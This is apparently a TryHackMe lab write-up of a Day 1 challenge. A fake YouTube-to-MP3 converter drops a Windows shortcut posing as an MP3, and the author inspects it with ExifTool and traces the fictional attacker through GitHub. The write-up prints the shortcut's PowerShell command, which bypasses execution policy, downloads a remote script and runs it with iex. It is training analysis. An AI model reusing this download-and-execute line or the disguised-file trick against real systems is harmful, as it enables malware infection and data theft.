# TryHackMe  

## Task 7: Day1  
![image](https://github.com/user-attachments/assets/d898a041-db45-4062-92c0-f3c5b4208557)


**OPSEC**: It stands for **Operational Security**.  
It is a set of principles which are used in order to protect the security of an operator or operation. It helps in 
**identifying and protecting senstive info from malicious websites**, ads, etc. This can be done using code names, 
strong, unique passwords, VPN while using Wi-Fi, etc.  

In this challenge, we are basically dealing with a YouTube to mp3 or mp4 converter website, which not only downloads the required song file, but with that some other suspicious files. 
![image](https://github.com/user-attachments/assets/c859a279-9e06-4764-9e7e-a353f9554d27)  

On converting the YouTube link, downloading and extracting the file, we see that apart of main file, 1 more file is downloaded, namely somg.mp3.   
<img width="960" alt="2024-12-12 (6)" src="https://github.com/user-attachments/assets/e10b2c41-ba6e-4650-a690-ed19c7d84927" />  

I opened the terminal of the AttackBox and commanded `file song.mp3`, which had nothing suspicious. Then `file somg.mp3`, which had a **MS Windows shortcut** (a `.lnk` file), instead of a song. This file type is used in Windows to link to another file/folder/application. 

Now, to inspect .lnk files to reveal the embedded commands and attributes, we used the **ExifTool**.  
![image](https://github.com/user-attachments/assets/00b6f4a8-3b6f-41a4-987c-b9961c08ae73)    

On investigating the file contents...  
```
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

Browsing this site https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 on the AttackBox's FireFox browser, we see a code that is meant to collect very sensitive info from the system and send to the attacker's remote server. This whole code was made by some M.M.  

To investigate the site's source code further, we used GitHub(https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues). In this there were 4 results, having various comments which helped us to know all about the attacker.    

We went to last one to find out that the findings were sent to a C2 server.  
![image](https://github.com/user-attachments/assets/c5544c94-450d-4eb3-b866-014bd2463e64)    

![image](https://github.com/user-attachments/assets/f36444d4-b4e2-484f-9bfe-bb11a89813b4)   

For finding author, I searched in the terminal output...  
![image](https://github.com/user-attachments/assets/1bea1070-c2fd-4611-962c-0a364e337ec1)    

The URL was given in the website itself. (and in comments as well).   
![image](https://github.com/user-attachments/assets/9c3f19f9-a795-4331-a8eb-8801fc9a34dd)    

M.M. (Mayor Malware) was found in the profile of MM-WarevilleTHM on GitHub.  
![image](https://github.com/user-attachments/assets/b761016f-82f5-46dc-946e-a19d6f2a98a9)   

Number of commits was found by going to CryptoWallet-Search of the same profile.   

![image](https://github.com/user-attachments/assets/b9a2598e-25ae-49e5-990c-495411752748)    



























